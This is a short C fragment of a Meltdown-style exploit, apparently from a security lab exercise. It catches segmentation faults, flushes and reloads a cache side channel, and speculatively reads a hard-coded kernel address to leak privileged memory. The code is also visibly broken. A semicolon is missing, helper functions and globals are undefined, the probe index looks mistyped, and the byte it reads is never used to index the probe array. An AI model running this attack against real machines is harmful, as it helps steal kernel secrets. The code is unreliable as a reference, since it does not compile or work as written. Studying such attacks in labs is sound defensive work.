int main(){
    signal(SIGSEGV,catch_segv);

    flushSideChannel();
    if(sigsetjmp(jbuf,1)==0)
    {
        meltdown(0xfa22f00);
    }else{
        printf("Memory access violation\n")

    }
    reloadSideChannel();
    return 0;
}
void meltdown(unsigned kernal_data_addr){
    char kernel_data=0;
    kernel_data=*(char*)kernal_data_addr;
    array[7*4094+DELTA]+=1;
}